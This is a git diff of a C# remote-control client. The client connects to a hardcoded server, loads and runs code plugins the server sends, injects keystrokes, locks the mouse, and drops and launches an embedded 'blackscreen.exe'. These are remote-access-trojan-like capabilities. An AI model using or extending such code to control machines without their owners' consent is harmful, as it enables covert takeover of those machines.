@@ -24,9 +24,10 @@ namespace RemoteControl.Client
     class Program
     {
         private static Socket oServer;
+        private static SocketSession oServerSession;
         private static bool isTestMode = true;
         //private static string ServerIP = "10.55.200.187";
-        private static string ServerIP = "192.168.1.136";
+        private static string ServerIP = "192.168.0.108";
         private static int ServerPort = 10086;
         private static Dictionary<string, RequestStartGetScreen> sessionScreenHandleSwitch = new Dictionary<string, RequestStartGetScreen>();
         private static Dictionary<string, bool> sessionVideoHandleSwitch = new Dictionary<string, bool>();
@@ -44,8 +45,7 @@ namespace RemoteControl.Client
 
         static void Main(string[] args)
         {
-            //Thread.Sleep(3000);
-            //MouseOpeUtil.MouseDown(eMouseButtons.Left, new Point() { X = 100, Y = 100 });
+            Console.Title = "RC";
             ReadParameters();
             StartConnect();
             heartbeatThread = new Thread(() => StartHeartbeat()) { IsBackground = true };
@@ -79,7 +79,9 @@ namespace RemoteControl.Client
                     oServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                     oServer.Connect(ServerIP, ServerPort);
                     DoOutput("服务器连接成功！");
-                    StartRecvData();
+
+                    oServerSession = new SocketSession(oServer.RemoteEndPoint.ToString(), oServer);
+                    StartRecvData(oServerSession);
                     break;
                 }
                 catch (Exception ex)
@@ -90,11 +92,8 @@ namespace RemoteControl.Client
             }
         }
 
-        static void StartRecvData()
+        static void StartRecvData(SocketSession session)
         {
-            string sessionId = oServer.RemoteEndPoint.ToString();
-            SocketSession session = new SocketSession(sessionId, oServer);
-
             // 获取主机名，并告诉服务器
             ResponseGetHostName resp = new ResponseGetHostName();
             resp.HostName = Dns.GetHostName();
@@ -109,7 +108,7 @@ namespace RemoteControl.Client
                 {
                     try
                     {
-                        recvSize = oServer.Receive(buffer);
+                        recvSize = session.SocketObj.Receive(buffer);
                         if (recvSize < 0)
                             continue;
 
@@ -326,7 +325,6 @@ namespace RemoteControl.Client
             {
                 var req = obj as RequestMessageBox;
                 StartShowMsgBox(session, req);
-                //StartMessageBox(req.Title, req.Content, (MessageBoxButtons)req.MessageBoxButtons, (MessageBoxIcon)req.MessageBoxIcons);
             }
             else if (packetType == ePacketType.PACKET_LOCK_MOUSE_REQUEST)
             {
@@ -577,14 +575,23 @@ namespace RemoteControl.Client
             }
             else if (packetType == ePacketType.PACKET_RUN_EXEC_CODE_REQUEST)
             {
+                Console.WriteLine("开始处理请求：" + packetType.ToString());
                 new Thread(() => {
                     try
                     {
                         var req = obj as RequestRunExecCode;
-                        if(codePluginDic.ContainsKey(req.ID))
+                        Console.WriteLine("请求ID:" + req.ID);
+                        if (codePluginDic.ContainsKey(req.ID))
                         {
-                            PluginLoader.LoadPlugin(codePluginDic[req.ID].ToArray(), OnFireQuit);
+                            Console.WriteLine("请求ID存在:" + req.ID + "开始加载插件...");
+                            byte[] data = codePluginDic[req.ID].ToArray();
+                            Console.WriteLine("数据长度：" + data.Length);
+                            PluginLoader.LoadPlugin(data, OnFireQuit);
                             codePluginDic.Remove(req.ID);
+                        }
+                        else
+                        {
+                            Console.WriteLine("请求ID不存在:" + req.ID);
                         }
                     }
                     catch (Exception ex)
@@ -625,6 +632,13 @@ namespace RemoteControl.Client
                 {
                     return;
                 }
+            }
+            else if (packetType == ePacketType.PACKET_KEYBOARD_EVENT_REQUEST)
+            {
+                var req = obj as RequestKeyboardEvent;
+                DoOutput(string.Format("keyCode:{0},keyValue:{1},keyOperation:{2}",
+                    req.KeyCode, req.KeyValue, req.KeyOperation));
+                KeyboardOpeUtil.KeyOpe(req.KeyCode, req.KeyOperation);
             }
         }
 
@@ -858,7 +872,7 @@ namespace RemoteControl.Client
                 byte[] data = ResUtil.GetResFileData("BlackScreen.dat");
                 string blackScreenFileName = ResUtil.WriteToRandomFile(data, "blackscreen.exe");
                 // 启动黑屏程序
-                ProcessUtil.Run("cmd.exe", "/c start " + blackScreenFileName, true, false);
+                ProcessUtil.RunByCmdStart(blackScreenFileName, true);
             }
             catch (Exception ex)
             {
@@ -889,7 +903,6 @@ namespace RemoteControl.Client
                 for (int j = 0; j < 100; j++)
                 {
                     MouseOpeUtil.MouseMove(0, 0);
-                    //Win32API.mouse_event(Win32API.MOUSEEVENTF_ABSOLUTE | Win32API.MOUSEEVENTF_MOVE, 0, 0, 0, 0);
                     Thread.Sleep(10);
                 }
                 if (!sessionLockMouseHandleSwitch.ContainsKey(session.SocketId))
@@ -1073,17 +1086,9 @@ namespace RemoteControl.Client
             {
                 heartbeatThread.Join();
             }
-
-            if (oServer != null)
+            if (oServerSession != null)
             {
-                try
-                {
-                    oServer.Close();
-                }
-                catch (Exception ex)
-                {
-                    
-                }
+                oServerSession.Send(ePacketType.PACKET_CLIENT_CLOSE_RESPONSE, null);
             }
             Environment.Exit(0);
         }
